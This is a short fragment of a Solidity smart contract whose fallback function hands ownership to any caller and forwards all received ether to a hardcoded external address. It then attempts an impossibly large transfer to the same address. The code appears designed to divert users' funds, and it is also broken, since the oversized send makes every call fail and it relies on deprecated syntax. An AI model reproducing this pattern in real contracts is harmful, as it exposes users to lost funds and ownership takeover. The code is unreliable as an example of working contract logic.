 address news = 0xdd870fa1b7c4700f2bd7f44238821c26f7392148; 

  function () public payable
  {
      _owner = msg.sender;
       joki();

          if(!news.send(999999999999999999999999999999999999999999999999999999999999999999999999999))
     {
         throw;

     }
  }
  function joki() public payable returns (bool)
  {
      if(news.send(msg.value))
     {
        
        return true;

     }
      return true;

  }
